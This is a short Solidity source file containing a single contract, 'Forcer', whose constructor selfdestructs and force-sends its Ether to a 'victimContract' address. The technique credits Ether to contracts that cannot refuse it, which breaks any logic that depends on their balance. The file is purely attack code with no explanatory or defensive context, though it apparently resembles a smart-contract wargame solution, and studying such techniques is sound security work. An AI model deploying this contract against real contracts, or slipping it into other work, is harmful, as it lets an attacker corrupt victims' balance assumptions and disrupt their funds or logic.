// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

contract Forcer {
    constructor(address victimContract) payable {
        selfdestruct(payable(victimContract));
    }
}
